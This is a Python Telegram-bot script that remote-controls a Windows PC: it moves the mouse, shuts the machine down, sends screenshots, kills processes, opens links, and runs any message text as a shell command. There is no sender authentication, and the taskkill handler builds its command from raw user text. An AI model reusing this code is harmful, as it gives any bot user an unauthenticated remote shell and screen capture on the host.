from os import system
from webbrowser import open as browser_open
import random
import telebot
from pyautogui import screenshot as sct
from mouse import move

bot = telebot.TeleBot('TOKEN')


@bot.message_handler(content_types=['text', 'photo'])
def lmdbot(message):
    if message.text == 'Move mouse':
        bot.register_next_step_handler(bot.send_message(message.from_user.id, 'How many times?'), mousemove)
    elif message.text == "Turn off the computer":
        system('shutdown -s -t 1')
    elif message.text == 'Send screenshot':
        screenshot(message)
    elif message.text == 'Close an application':
        bot.register_next_step_handler(
            bot.send_message(message.from_user.id, 'Type the name of an application'), taskkill)
    elif message.text == "Open a link in browser":
        bot.register_next_step_handler(bot.send_message(message.from_user.id, 'Type the link'), openlink)
    elif message.text == 'Execute in cmd':
        bot.register_next_step_handler(bot.send_message(message.from_user.id, 'Type a command'), cmd)
    else:
        markup = telebot.types.ReplyKeyboardMarkup(row_width=2)
        markup.add(telebot.types.KeyboardButton("Move mouse"))
        markup.add(telebot.types.KeyboardButton("Turn off the computer"))
        markup.add(telebot.types.KeyboardButton("Send screenshot"))
        markup.add(telebot.types.KeyboardButton("Close an application"))
        markup.add(telebot.types.KeyboardButton("Execute in cmd"))
        markup.add(telebot.types.KeyboardButton("Open a link in browser"))
        bot.send_message(message.from_user.id, "What to do?", reply_markup=markup)


def mousemove(message):
    try:
        times = int(message.text)
        for a in range(times):
            rh = random.randint(0, 1024)
            rw = random.randint(0, 1280)
            move(rw, rh, duration=0.5)
    except:
        lmdbot(message)


def taskkill(message):
     task = message.text
     system('taskkill /IM ' + task + ' /f')


def cmd(message):
    command = message.text
    system(command)


def screenshot(message):
    try:
        sct('screenshot.png')
        with open('screenshot.png', 'rb') as photo:
            bot.send_photo(message.from_user.id, photo)
    except:
        lmdbot(message)


def openlink(message):
    link = message.text
    browser_open(link, new=0, autoraise=True)


bot.polling(none_stop=True)
